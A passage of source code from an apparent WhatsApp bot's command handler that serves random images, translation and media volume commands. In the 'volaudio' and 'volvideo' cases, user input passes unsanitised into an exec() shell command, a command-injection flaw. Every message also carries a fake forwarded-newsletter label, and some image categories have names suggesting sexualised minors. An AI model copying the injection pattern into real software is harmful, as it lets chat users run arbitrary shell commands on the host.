_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'randomboy':{
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'thai':{
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'vietnamese':{
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'indo':{
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
			case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'meow':{
                axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
			case 'wallhp': case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli2': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu2': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
await XeonStickWait()
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: yeha}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
			case 'translate':{
  	if (!q) return replygcxeon(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} <language id> <text>*\n*${prefix + command} ja yo wassup*`)
  	const defaultLang = 'en'
const tld = 'cn'
    let err = `
 *Example:*

*${prefix + command}* <id> [text]
*${prefix + command}* en Hello World

≡ *List of supported languages:* 
https://cloud.google.com/translate/docs/languages
`.trim()
    let lang = args[0]
    let text = args.slice(1).join(' ')
    if ((args[0] || '').length !== 2) {
        lang = defaultLang
        text = args.join(' ')
    }
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text
    try {
       let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null) 
       let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: result.text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
    } catch (e) {
        return replygcxeon(err)
    } 
    }
    break
    case 'coffee': case 'kopi': {
                let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: 'https://coffee.alexflipnote.dev/random'} }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'wallpaper': {
                if (!text) return replygcxeon('Enter Query Title')
                await XeonStickWait()
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]       
         let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of ${text}*_\n\n${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: result.image[0]}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command} ${text}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                
            }
            break
            case 'wikimedia': {
                if (!text) return replygcxeon('Enter Query Title')
                await XeonStickWait()
		let { wikimedia } = require('./lib/scraper')
                let anumedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of ${text}*_\n\n${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: result.image}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command} ${text}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                
            }
            break
    case 'aesthetic':{
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
			case 'ebinary': {
if (!q) return replygcxeon(`Send/reply text with captions ${prefix + command}`)
let { eBinary } = require('./lib/binary')
let eb = await eBinary(`${q}`)
replygcxeon(eb)
}
break
case 'dbinary': {
if (!q) return replygcxeon(`Send/reply text with captions ${prefix + command}`)
let { dBinary } = require('./lib/binary')
let db = await dBinary(`${q}`)
replygcxeon(db)
}
break
			  case 'volaudio': {
if (!args.join(" ")) return replygcxeon(`Example: ${prefix + command} 10`)
media = await XeonBotInc.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcxeon('Error!')
jadie = fs.readFileSync(rname)
XeonBotInc.sendMessage(m.chat, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
case 'volvideo': {
if (!args.join(" ")) return replygcxeon(`Example: ${prefix + command} 10`)
media = await XeonBotInc.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
